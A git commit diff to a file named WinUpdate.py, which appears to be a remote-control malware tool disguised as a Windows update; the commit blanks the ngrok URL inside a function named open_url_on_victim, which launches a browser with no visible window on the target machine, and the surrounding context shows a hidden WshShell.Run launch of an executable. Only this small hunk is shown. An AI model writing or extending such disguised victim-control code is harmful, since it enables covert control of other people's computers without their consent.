6ed970e2c67c5add2f1a2ef6b4a0a3fd77cdaae6
AIbyAbdullah <hafizabdullahkhanak@gmail.com>
2026-09-14 12:26:12 +0500

    Clear URL in open_url_on_victim function
    Change URL in open_url_on_victim function to an empty string.

--- WinUpdate.py
+++ WinUpdate.py
@@ -435,7 +435,7 @@ WshShell.Run """{sys.executable}"" ""{exe_path}""", 0, False
     # OPEN URL
     # ======================================================
     def open_url_on_victim():
-        url = "https://reformist-handed-trapping.ngrok-free.dev"
+        url = ""
         try:
             subprocess.Popen(f'start {url}', shell=True, creationflags=NO_WINDOW_FLAG)
             time.sleep(2)
